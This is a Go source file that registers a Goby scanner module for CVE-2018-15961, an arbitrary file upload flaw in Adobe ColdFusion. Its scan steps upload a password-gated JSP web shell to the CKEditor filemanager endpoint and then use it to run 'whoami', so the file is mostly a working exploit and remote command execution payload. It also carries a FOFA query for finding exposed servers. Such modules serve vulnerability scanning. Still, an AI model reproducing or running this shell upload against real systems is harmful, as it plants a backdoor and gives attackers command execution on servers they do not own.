package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Adobe ColdFusion upload.cfm 任意文件上传漏洞 CVE-2018-15961",
  "Description": "<p><span style=\"font-size: 16px;\">Adobe ColdFusion存在任意文件上传漏洞，通过漏洞攻击者可上传任意文件控制服务器</span><br></p>",
  "Product": "",
  "Homepage": "",
  "DisclosureDate": null,
  "Author": "清晨",
  "FofaQuery": "app=\"Adobe-ColdFusion\" || product=\"Adobe-ColdFusion\"",
  "GobyQuery": "app=\"Adobe-ColdFusion\" || product=\"Adobe-ColdFusion\"",
  "Level": "2",
  "Impact": "",
  "Recommendation": "",
  "References": [],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm",
        "follow_redirect": true,
        "header": {
          "Content-Type": "multipart/form-data; boundary=e9fb732e96144291860c4d742145cdabf98a4ec5cbe2a91aec6dc17461a0",
          "Accept-Encoding": "gzip"
        },
        "data_type": "text",
        "data": "--e9fb732e96144291860c4d742145cdabf98a4ec5cbe2a91aec6dc17461a0\nContent-Disposition: form-data; name=\"file\"; filename=\"aabbcc.jsp\"\nContent-Type: application/octet-stream\n\n<%\n    if(\"01001\".equals(request.getParameter(\"pwd\"))){\n        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"i\")).getInputStream();\n        int a = -1;\n        byte[] b = new byte[2048];\n        out.print(\"<pre>\");\n        while((a=in.read(b))!=-1){\n            out.println(new String(b));\n        }\n        out.print(\"</pre>\");\n    }\n%>\n\n--e9fb732e96144291860c4d742145cdabf98a4ec5cbe2a91aec6dc17461a0\nContent-Disposition: form-data; name=\"path\"\n\npath\n--e9fb732e96144291860c4d742145cdabf98a4ec5cbe2a91aec6dc17461a0--"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/aabbcc.jsp?pwd=01001&i=whoami",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [],
  "VulType": [],
  "CVEIDs": [
    "CVE-2018-15961"
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "Adobe ColdFusion upload.cfm 任意文件上传漏洞 CVE-2018-15961",
      "Product": "",
      "Description": "<p><span style=\"font-size: 16px;\">Adobe ColdFusion存在任意文件上传漏洞，通过漏洞攻击者可上传任意文件控制服务器</span><br></p>",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    },
    "EN": {
      "Name": "Adobe ColdFusion upload.cfm upload file",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}